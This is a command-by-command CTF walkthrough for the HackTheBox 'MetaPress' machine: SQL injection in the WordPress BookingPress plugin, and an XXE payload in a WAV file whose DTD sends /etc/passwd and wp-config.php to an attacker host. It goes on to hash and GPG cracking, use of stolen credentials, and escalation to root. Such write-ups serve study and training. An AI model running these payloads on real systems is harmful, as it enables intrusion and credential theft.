## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
## 🌐 Recon Phase

### Nmap Full Port Scan + Service Version Detection
```bash
nmap -p- --min-rate 10000 10.10.11.186
nmap -p 21,22,80 -sCV 10.10.11.186
```

### Add Host Mapping
```bash
echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
```

### [Wfuzz for Subdomains](HTTP.md)
```bash
wfuzz -u http://10.10.11.186 -H "Host: FUZZ.metapress.htb" \
-w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 145
```

---

## 🧨 SQL Injection (BookingPress Plugin)

### Identify Nonce from Page Source
```bash
# Example nonce found in /events/ page JS
'_wpnonce=6027d5fa3e'
```

### SQLMap Setup
Save this as `sqli.req` (modified from Burp):
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
Content-Type: application/x-www-form-urlencoded

action=bookingpress_front_get_category_services&_wpnonce=6027d5fa3e&category_id=33&total_service=223
```

### Run SQLMap
```bash
sqlmap -r sqli.req -p total_service --dbs
sqlmap -r sqli.req -p total_service -D blog --tables
sqlmap -r sqli.req -p total_service -D blog -T wp_users --dump
```

---

## 🔐 Cracking WordPress Hash

### Save Hashes
```text
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

### Hashcat
```bash
hashcat -m 400 -a 0 wp.hashes /usr/share/wordlists/rockyou.txt --username
# Cracked: manager:partylikearockstar
```

---

## 🎯 XXE Exploit for File Disclosure

### payload.wav
```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://10.10.14.6/evil.dtd">%remote;%init;%trick;]>\x00' > payload.wav
```

### evil.dtd (serve via Python HTTP server)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.6/?p=%file;'>">
```

### Serve DTD
```bash
python3 -m http.server 80
```

---

## 🔐 Extract [FTP](FTP) + DB Credentials

From `evil.dtd`, modify to target:
```xml
php://filter/convert.base64-encode/resource=../wp-config.php
```

Expected credentials:
```php
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
```

---

## 📂 FTP Enumeration

```bash
ftp metapress.htb@metapress.htb
# Enter password from wp-config
```

Check files in `/mailer/send_email.php` → extract SMTP creds:
```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

---

## 🧑‍💻 Shell as `jnelson`

```bash
sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@metapress.htb
cat ~/user.txt
```

---

## 🧬 Privilege Escalation via Passpie + GPG

### Extract `.keys` and Format with `gpg2john`
```bash
scp jnelson@metapress.htb:~/.passpie/.keys keys
gpg2john keys | tee gpg.hash
```

### Crack with John
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
# Found passphrase: blink182
```

### Retrieve Root Password via Passpie
```bash
passpie copy --to stdout --passphrase blink182 root@ssh
# Output: p7qfAZt4_A1xo_0x
```

---

## 🟢 Root Shell

```bash
su -
# Enter root pass: p7qfAZt4_A1xo_0x
cat /root/root.txt
```